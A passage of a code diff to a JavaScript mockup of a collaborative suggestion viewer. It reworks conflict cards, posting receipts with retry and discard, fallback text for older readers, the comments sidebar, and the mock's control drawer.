+      h('span', { class: 'card-member-text' }, h('ins', { class: 'sg-ins' }, m.ins)),
+      out ? h('span', { class: 'card-member-text' }, h('span', { class: BADGE_CLASS[out.tone] }, out.badge)) : null);
+  }));
   return h('div', { class: 'popover popover-card sg-card is-conflict', role: 'dialog', 'aria-label': `${g.members.length} suggestions on one passage` },
-    h('div', { class: 'card-head' }, h('span', { class: 'card-who' }, `${g.members.length} suggestions on this passage`), h('span', { class: 'card-time' }, 'conflict group')),
+    h('div', { class: 'card-head' }, h('span', { class: 'card-who' }, `${g.members.length} suggestions on this passage`)),
     h('div', { class: 'card-row' }, h('span', { class: 'k' }, 'Original'), h('span', { class: 'v' }, h('del', { class: 'sg-del' }, g.del))),
-    fs,
-    h('p', { class: 'card-note' }, 'Your choice changes only your own applied view. Dana, the publisher, decides what ships.'),
-    h('div', { class: 'card-row', style: 'margin-top:.5rem' }, h('span', { class: 'k' }, 'Thread'), h('span', { class: 'v' }, `${PEOPLE[fm.author].name} \u00b7 ${fm.time}`)),
-    repliesList(fm),
-    ...composer(fm));
+    members,
+    h('p', { class: 'card-note' }, `The applied view shows ${first(def.author)}\u2019s (posted first).`),
+    h('div', { class: 'popover-tools' }, h('button', { type: 'button', class: 'popover-action is-quiet is-end', onclick: closeCard }, 'Close')));
 }
 
 /* Selection offers: Reading (S3) and the applied view (A2). */
@@ -1693,7 +1719,7 @@ function selectionOffer() {
     pop = h('div', { class: 'popover popover-offer-wrap', role: 'toolbar', 'aria-label': 'Selection' }, h('div', { class: 'popover-offer' },
       copy,
       h('button', { type: 'button', class: 'popover-action', onmousedown: noFocus, onclick: () => { closeOffer(); showMockNote(rect, 'The comment composer opens here, unchanged from today.'); } }, icon('comment'), h('span', null, 'Comment')),
-      V.outcomes ? null : h('button', { type: 'button', class: 'popover-action', onmousedown: noFocus, onclick: () => suggestFromSelection(a, b) }, icon('pencil'), h('span', null, 'Suggest edit'))));
+      V.unavailable ? null : h('button', { type: 'button', class: 'popover-action', 'data-suggest': '', onmousedown: noFocus, onclick: () => suggestFromSelection(a, b) }, icon('pencil'), h('span', null, 'Suggest edit'))));
   }
   V.offer = pop;
   place(pop, rect, 'above');
@@ -1712,7 +1738,6 @@ function suggestFromSelection(a, b) {
   const rect = blockEl ? blockEl.getBoundingClientRect() : V.root.getBoundingClientRect();
   V.root.focus({ preventScroll: true });
   if (!a || !b) return;
-  if (a.ro || b.ro) return refuse('not-source-text', rect, null, null, { ro: a.ro || b.ro });
   if (a.block !== b.block) return refuse('crosses-blocks', rect);
   if (a.where === 'others-ins' || b.where === 'others-ins') return refuse('others-insertion', rect, a.id || b.id);
   if (a.run !== b.run || a.where !== 'text' || b.where !== 'text') return refuse('crosses-formatting', rect);
@@ -1756,7 +1781,7 @@ function openSignIn() {
 
 /* Mode and the applied switch. */
 function setMode(m) {
-  if (V.outcomes && m === 'suggesting') return;
+  if (V.unavailable && m === 'suggesting') return;
   const want = m === 'suggesting';
   if (want && !V.signedIn) return openSignIn();
   if (V.draft) commit('mode');
@@ -1774,66 +1799,47 @@ function setApplied(on) {
   buildViewer();
 }
 
-/* ---------------- receipt and unsent tray ---------------- */
-function showReceipt(r) { V.receipt = r; if (r.notice) V.noticeSeen = true; renderReceipt(); }
+/* ---------------- receipt ---------------- */
+function showReceipt(r) { V.receipt = r; renderReceipt(); }
 function renderReceipt() {
   if (V.receiptEl) V.receiptEl.remove();
   V.receiptEl = null;
   const r = V.receipt;
-  if (!r) { layoutDock(); return; }
-  const el = h('section', { class: 'sg-dock sg-receipt', role: 'status', 'aria-live': 'polite', 'aria-label': 'Suggestion receipt' });
-  el.append(h('div', { class: 'rc-head' }, icon(r.kind === 'undone' ? 'undo' : r.kind === 'removed' ? 'trash' : 'check'), h('strong', null, r.title), h('span', { class: 'rc-time' }, 'just now'),
-    h('button', { type: 'button', class: 'rc-close', 'aria-label': 'Dismiss', onmousedown: noFocus, onclick: () => { V.receipt = null; renderReceipt(); } }, icon('x'))));
-  if (r.notice) el.append(h('div', { class: 'rc-notice' },
-    h('p', null, h('b', null, 'You typed inside the publisher\u2019s page. '), 'Its scripts can see every keystroke, including drafts you cancel, and can change the text before it posts. This panel is Relic\u2019s, outside the page, and shows exactly what was posted.'),
-    h('button', { type: 'button', class: 'popover-action', onmousedown: noFocus, onclick: (e) => { e.currentTarget.parentElement.remove(); r.notice = false; } }, 'Got it')));
-  if (r.del != null || r.ins != null) {
+  if (!r) return;
+  const failed = r.kind === 'failed';
+  const el = h('section', { class: 'sg-dock sg-receipt' + (failed ? ' is-failed' : ''), role: failed ? 'alert' : 'status', 'aria-live': 'polite', 'aria-label': 'Suggestion receipt' });
+  el.append(h('div', { class: 'rc-head' }, icon(failed ? 'warn' : r.kind === 'undone' ? 'undo' : r.kind === 'removed' ? 'trash' : 'check'), h('strong', null, r.title), h('span', { class: 'rc-time' }, 'just now'),
+    failed ? null : h('button', { type: 'button', class: 'rc-close', 'aria-label': 'Dismiss', onmousedown: noFocus, onclick: () => { V.receipt = null; renderReceipt(); } }, icon('x'))));
+  if (r.del || r.ins) {
     el.append(h('div', { class: 'rc-body' },
       r.del ? h('div', { class: 'card-row' }, h('span', { class: 'k' }, 'Struck'), h('span', { class: 'v' }, h('del', { class: 'sg-del', style: 'white-space:pre-wrap' }, r.del))) : null,
       r.ins ? h('div', { class: 'card-row' }, h('span', { class: 'k' }, 'Inserted'), h('span', { class: 'v' }, h('ins', { class: 'sg-ins', style: 'white-space:pre-wrap' }, r.ins))) : null,
       sourceRow(r.source)));
   }
-  if (r.repeated) el.append(h('p', { class: 'rc-warn' }, icon('warn'), `This text appears ${r.repeated} times; your suggestion changes all of them.`));
   if (r.sub) el.append(h('p', { class: 'rc-sub' }, r.sub));
-  if (r.undo || r.id) el.append(h('div', { class: 'popover-tools' },
+  if (r.warn) el.append(h('p', { class: 'rc-warn' }, icon('warn'), r.warn));
+  if (failed) el.append(h('div', { class: 'popover-tools' },
+    h('button', { type: 'button', class: 'popover-action is-primary', onmousedown: noFocus, onclick: () => r.retry() }, icon('retry'), 'Retry'),
+    h('button', { type: 'button', class: 'popover-action is-quiet', onmousedown: noFocus, onclick: () => r.discard() }, icon('trash'), 'Discard')));
+  else if (r.undo || r.id) el.append(h('div', { class: 'popover-tools' },
     r.undo ? h('button', { type: 'button', class: 'popover-action', onmousedown: noFocus, onclick: () => r.undo() }, icon('undo'), 'Undo') : null,
     r.id && V.active.has(r.id) ? h('button', { type: 'button', class: 'popover-action is-quiet', onmousedown: noFocus, onclick: () => openCardAt(r.id, { pinned: true }) }, 'Open thread') : null));
   V.main.append(el);
   V.receiptEl = el;
-  layoutDock();
 }
-function renderUnsent() {
-  if (V.unsentEl) V.unsentEl.remove();
-  V.unsentEl = null;
-  if (!V.unsent.length) { layoutDock(); return; }
-  const n = V.unsent.length;
-  const el = h('section', { class: 'sg-dock sg-unsent', 'aria-label': 'Unsent suggestions' },
-    h('button', { type: 'button', class: 'us-head', 'aria-expanded': String(V.unsentOpen), onclick: () => { V.unsentOpen = !V.unsentOpen; renderUnsent(); } },
-      icon('warn'), `${n} suggestion${n > 1 ? 's' : ''} not sent`, h('span', { class: 'chev' }, icon('chevron'))));
-  if (V.unsentOpen) el.append(h('ol', { class: 'us-list' }, ...V.unsent.map((u) => h('li', { class: 'us-item' },
-    h('div', { class: 'us-where' }, u.where),
-    h('div', { class: 'us-diff' }, h('del', { class: 'sg-del' }, u.del), ' ', h('ins', { class: 'sg-ins' }, u.ins)),
-    h('p', { class: 'us-why' }, u.why),
-    h('div', { class: 'popover-tools' },
-      h('button', { type: 'button', class: 'popover-action is-primary', onclick: () => retryUnsent(u) }, icon('retry'), 'Retry'),
-      h('button', { type: 'button', class: 'popover-action is-quiet', onclick: () => { V.unsent = V.unsent.filter((x) => x !== u); renderUnsent(); } }, 'Discard'))))));
-  V.main.append(el);
-  V.unsentEl = el;
-  layoutDock();
+
+/* The body an older reader shows: suggestionFallbackBody, which clips each text to 96
+   bytes and shows LF and TAB as spaces (plan 3.1). */
+function clip96(s) {
+  let out = '';
+  for (const c of s.replace(/[\n\t]/g, ' ')) { if (bytes(out + c) > 96) return out + '\u2026'; out += c; }
+  return out;
 }
-function retryUnsent(u) {
-  if (u.repeats) { u.why = 'Still repeats in the source. Discard it and select a longer passage.'; renderUnsent(); return; }
-  V.unsent = V.unsent.filter((x) => x !== u);
-  const id = 'c-you-' + (++V.seq);
-  V.changes[id] = { id, author: 'you', block: u.block, del: u.del, ins: u.ins, fmt: null, time: 'just now', replies: [] };
-  ensureMarker(u.block, id); V.active.add(id); V.flash = id; renderBlock(u.block);
-  showReceipt({ kind: 'posted', title: 'Suggestion posted', del: u.del, ins: u.ins, id, sub: 'Sent from the Unsent tray.',
-    undo: () => { V.active.delete(id); renderBlock(u.block); showReceipt({ kind: 'undone', title: 'Undone', sub: 'The suggestion was deleted.' }); renderThread(); refreshBand(); } });
-  renderUnsent(); renderThread(); refreshBand();
-}
-function layoutDock() {
-  const narrow = V.main.clientWidth <= 704;
-  if (V.unsentEl) V.unsentEl.style.bottom = narrow && V.receiptEl ? (V.receiptEl.offsetHeight + 16) + 'px' : '';
+function fallbackBody(ch) {
+  const tail = ' A current Relic viewer shows it in place.';
+  if (!ch.del) return `Suggested edit: insert "${clip96(ch.ins)}" ${ch.mode === 'before' ? 'before' : 'after'} "${clip96(ch.exact || '')}".` + tail;
+  if (!ch.ins) return `Suggested edit: delete "${clip96(ch.del)}".` + tail;
+  return `Suggested edit: replace "${clip96(ch.del)}" with "${clip96(ch.ins)}".` + tail;
 }
 
 /* ---------------- comments sidebar ---------------- */
@@ -1850,31 +1856,26 @@ function renderThread() {
   t.hidden = !V.sidebar;
   t.classList.toggle('is-open', V.sidebar);
   if (!V.sidebar) { t.replaceChildren(); return; }
-  const title = h('div', { class: 'thread-title' }, h('span', null, V.outcomes ? 'Suggestions on version 2' : 'Comments'),
+  const title = h('div', { class: 'thread-title' }, h('span', null, 'Comments'),
     h('button', { type: 'button', class: 'thread-close', 'aria-label': 'Close comments', onclick: () => { V.sidebar = false; renderThread(); refreshBand(); } }, icon('x')));
   const list = h('ol', { class: 'thread-list' });
-  if (V.outcomes) {
-    for (const o of V.outcomes) list.append(h('li', { class: 'comment' },
-      h('div', { class: 'comment-head' }, h('span', { class: 'comment-name' }, PEOPLE[o.who].name), h('span', { class: 'comment-badge ' + ({ ok: 'is-ok', soft: 'is-soft', warn: 'is-warn', wait: '' }[o.tone]) }, o.badge)),
-      h('p', { class: 'comment-body' }, h('del', { class: 'sg-del' }, o.del), ' ', h('ins', { class: 'sg-ins' }, o.ins)),
-      o.sub ? h('p', { class: 'comment-sub' }, o.sub) : null,
-      o.note ? h('ol', { class: 'comment-replies' }, h('li', null, h('div', { class: 'comment-head' }, h('span', { class: 'comment-name' }, PEOPLE[o.note.who].name), h('span', { class: 'comment-badge is-soft' }, 'publisher outcome')), h('p', { class: 'comment-body' }, o.note.body))) : null));
-  } else {
-    for (const id of suggestionIds()) {
-      const ch = V.changes[id];
-      const item = h('li', { class: 'comment', tabindex: '0', onclick: () => openCardAt(id, { pinned: true }) },
-        h('div', { class: 'comment-head' }, h('span', { class: 'comment-name' }, PEOPLE[ch.author].name), h('span', { class: 'comment-author' }, PEOPLE[ch.author].email), h('span', { class: 'comment-time' }, ch.time)));
-      if (V.legacy) {
-        item.append(h('p', { class: 'comment-quote' }, 'on \u201c' + (ch.source ? ch.source[0] : ch.del) + '\u201d'),
-          h('p', { class: 'comment-body' }, `Suggested edit: \u201c${ch.del.slice(0, 80)}\u201d \u2192 \u201c${ch.ins.slice(0, 80)}\u201d`));
-        if (ch.fmt) item.append(h('p', { class: 'mk-note' }, 'Mock: no mark on the page. The source quote contains ** markup, which this viewer matches against rendered text and cannot place.'));
-      } else {
-        item.append(h('div', { class: 'comment-head', style: 'margin:0 0 .3rem' }, h('span', { class: 'comment-badge' + (ch.author === 'you' ? '' : ' is-soft') }, ch.group ? 'conflict group' : ch.author === 'you' ? 'your suggestion' : 'suggestion')),
-          h('p', { class: 'comment-body' }, ch.del ? h('del', { class: 'sg-del' }, ch.del) : null, ' ', h('ins', { class: 'sg-ins' }, ch.ins)));
-      }
-      if (ch.replies.length) item.append(h('ol', { class: 'comment-replies' }, ...ch.replies.map((r) => h('li', null, h('div', { class: 'comment-head' }, h('span', { class: 'comment-name' }, PEOPLE[r.who].name), h('span', { class: 'comment-time' }, r.time)), h('p', { class: 'comment-body' }, r.body)))));
-      list.append(item);
+  for (const id of suggestionIds()) {
+    const ch = V.changes[id];
+    const item = h('li', { class: 'comment', tabindex: '0', onclick: () => { if (!V.legacy) openCardAt(id, { pinned: true }); } },
+      h('div', { class: 'comment-head' }, h('span', { class: 'comment-name' }, ch.display || PEOPLE[ch.author].name), h('span', { class: 'comment-author' }, PEOPLE[ch.author].email), h('span', { class: 'comment-time' }, ch.time)));
+    if (V.legacy) {
+      item.append(h('p', { class: 'comment-body' }, fallbackBody(ch)),
+        h('p', { class: 'comment-sub' }, 'This comment points at part of the document that this page cannot show.'));
+    } else {
+      item.append(h('div', { class: 'comment-head', style: 'margin:0 0 .3rem' }, stateEl(id).firstChild, ch.author === 'you' ? h('span', { class: 'comment-badge' }, 'yours') : null),
+        h('p', { class: 'comment-body' }, ch.del ? h('del', { class: 'sg-del' }, ch.del) : null, ch.del && ch.ins ? ' ' : null, ch.ins ? h('ins', { class: 'sg-ins' }, ch.ins) : null),
+        ch.group ? h('p', { class: 'comment-sub' }, `One of ${V.groups[ch.group].members.length} suggestions on \u201c${V.groups[ch.group].del}\u201d`) : null,
+        ch.also && ch.also.length ? h('p', { class: 'comment-sub' }, 'Also suggested by ' + ch.also.map((k) => PEOPLE[k].name).join(', ')) : null);
+      const out = V.outcomes && V.outcomes[id];
+      if (out && out.note) item.append(h('ol', { class: 'comment-replies' }, h('li', null, h('div', { class: 'comment-head' }, h('span', { class: 'comment-name' }, PEOPLE.dana.name), h('span', { class: 'comment-badge is-soft' }, 'publisher')), h('p', { class: 'comment-body' }, out.note))));
     }
+    if (ch.replies.length && !V.outcomes) item.append(h('ol', { class: 'comment-replies' }, ...ch.replies.map((r) => h('li', null, h('div', { class: 'comment-head' }, h('span', { class: 'comment-name' }, PEOPLE[r.who].name), h('span', { class: 'comment-time' }, r.time)), h('p', { class: 'comment-body' }, r.body)))));
+    list.append(item);
   }
   t.replaceChildren(title, list);
 }
@@ -1958,6 +1959,17 @@ function scrollBlockTo(block, frac) {
   V.wrap.scrollTop += br.top - wr.top - wr.height * frac;
   drawPresence(); if (V.draft) updateHint();
 }
+/* A1: the browser shows a link's title only as a native tooltip, which a screenshot cannot
+   catch, so the mock draws what the tooltip says beside the link. */
+function pinLinkNote() {
+  const a = V.root.querySelector('[data-added-link]');
+  if (!a) return;
+  const sr = V.stage.getBoundingClientRect(), ar = a.getBoundingClientRect();
+  const note = h('p', { class: 'mk-note mk-pin' }, `Mock: the native tooltip. This <a> has no href; its title reads \u201c${a.title}\u201d.`);
+  V.stage.append(note);
+  note.style.left = Math.max(4, Math.min(ar.left - sr.left, V.stage.clientWidth - note.offsetWidth - 6)) + 'px';
+  note.style.top = (ar.bottom - sr.top + 6) + 'px';
+}
 
 /* ---------------- mock chrome ---------------- */
 let drawerOpen = false;
@@ -1973,7 +1985,7 @@ function renderChrome() {
     h('div', { class: 'mk-title', title: st.title }, h('b', null, st.id + (st.key !== st.id ? ' \u00b7 ' + (st.theme || '') : '')), st.title),
     h('button', { type: 'button', class: 'mk-btn', 'aria-label': 'Next state', title: 'Next state', onmousedown: noFocus, onclick: () => step(1) }, h('span', { 'aria-hidden': 'true' }, '\u203a')),
     h('button', { type: 'button', class: 'mk-btn', 'aria-expanded': String(drawerOpen), title: 'All states', onmousedown: noFocus, onclick: () => toggleDrawer() }, icon('list'), h('span', { class: 'mk-wide' }, 'States')),
-    h('button', { type: 'button', class: 'mk-btn', title: 'Replay peer activity: Priya types in Scope, Marcus moves', disabled: V.doc.cls !== 'md' || V.legacy || V.outcomes ? true : null, onmousedown: noFocus, onclick: replay, 'data-replay': '' }, icon('play'), h('span', { class: 'mk-wide' }, 'Replay peer activity')),
+    h('button', { type: 'button', class: 'mk-btn', title: 'Replay peer activity: Priya types in Scope, Marcus moves', disabled: V.doc.cls !== 'md' || V.legacy || V.outcomes || V.unavailable ? true : null, onmousedown: noFocus, onclick: replay, 'data-replay': '' }, icon('play'), h('span', { class: 'mk-wide' }, 'Replay peer activity')),
     h('button', { type: 'button', class: 'mk-btn', title: 'Toggle theme', 'aria-label': 'Toggle theme', onmousedown: noFocus, onclick: () => { const cur = document.documentElement.dataset.theme; themeOverride = cur === 'dark' ? 'light' : 'dark'; document.documentElement.dataset.theme = themeOverride; requestAnimationFrame(drawPresence); } }, icon('sun')));
   if (drawerOpen) bar.append(buildDrawer());
 }
@@ -1982,7 +1994,7 @@ function buildDrawer() {
   const groups = [...new Set(STATES.map((s) => s.group))];
   const frames = [['As specified', null], ['1440', 'full'], ['390', '390'], ['320', '320']];
   return h('div', { class: 'mk-drawer' },
-    h('p', null, 'States from plan.md section 7, labelled by id. Dashed rules are mock chrome. To try it: open S1, click into any paragraph and type. Click outside the paragraph (or press Tab) to post and see the receipt with Undo; Esc cancels a draft. Hover any tracked change to open its card and reply. Turn on \u201cShow suggestions applied\u201d and select edited text to reply from the applied view. \u201cReplay peer activity\u201d runs Priya and Marcus; start typing in Scope first to watch Priya\u2019s change fold into a badge on your draft (S7).'),
+    h('p', null, 'States from plan.md section 3.6, labelled by id. Dashed rules are mock chrome. To try it: open S1, click into any paragraph and type. Click outside the paragraph (or press Tab) to post and see the receipt with Undo; Esc cancels a draft. Hover any tracked change to open its card and reply. Turn on \u201cShow suggestions applied\u201d and select edited text to reply from the applied view. \u201cReplay peer activity\u201d runs Priya and Marcus; start typing in Scope first to watch Priya\u2019s change fold into a badge on your draft.'),
     h('div', { class: 'mk-controls' }, h('span', null, 'Frame'), ...frames.map(([label, f]) => h('button', { type: 'button', class: 'mk-btn', 'aria-pressed': String(frameOverride === f), onclick: () => { frameOverride = f; go(V.st.key); } }, label)),
       h('span', null, 'Theme'), h('button', { type: 'button', class: 'mk-btn', 'aria-pressed': String(themeOverride == null), onclick: () => { themeOverride = null; go(V.st.key); } }, 'As specified')),
     ...groups.map((g) => [h('h3', null, g), h('ol', null, ...STATES.filter((s) => s.group === g).map((s) => h('li', null,
